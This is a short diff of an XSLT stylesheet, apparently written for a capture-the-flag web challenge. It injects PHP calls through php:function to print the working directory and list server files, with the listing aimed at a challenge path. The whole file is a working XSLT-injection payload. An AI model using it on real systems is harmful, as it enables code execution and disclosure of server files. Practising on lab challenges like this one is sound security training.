@@ -5,10 +5,7 @@
   <xsl:output method="html"/>
   <xsl:template match="/">
     <pre>
-CWD: <xsl:value-of select="php:function('getcwd')"/>
-
-FILES:
-<xsl:value-of select="php:function('implode', '&#10;', php:function('scandir', '.'))"/>
+<xsl:value-of select="php:function('print_r', php:function('scandir', '/challenge/web-serveur/ch50'), true())"/>
     </pre>
   </xsl:template>
 </xsl:stylesheet>
